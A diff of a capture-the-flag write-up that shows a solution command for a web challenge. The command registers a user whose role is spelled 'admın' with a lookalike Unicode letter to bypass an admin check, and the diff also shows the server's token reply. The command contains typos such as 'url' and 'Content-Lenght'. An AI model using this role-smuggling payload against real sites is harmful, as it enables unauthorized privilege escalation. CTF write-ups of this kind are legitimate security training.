@@ -21,7 +21,7 @@ However, with the second flag, i.e. changing the role from `user` to `admin`, th
 example solution
 url --path-as-is -i -s -k -X $'POST' -H '$HOST: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.cat' -H'Content-Type: application/json' -H $'Content-Lenght: 53' --data-binary $'{\"username\":\"fw\",\"password\":\"sus\",\"role\":\"admın\"}' $'https://escatlate-52bc47e034fa.1753ctf.com/api/register'
 ```
-Then we can recive:
+Then we recive:
 ```bash
 {"username":"fw","password":"sus","token":"2b0b185cdbd08004698673d68697f262f2511ad8c446a98e2c058759aa4478e2","role":"admın"}
 ```
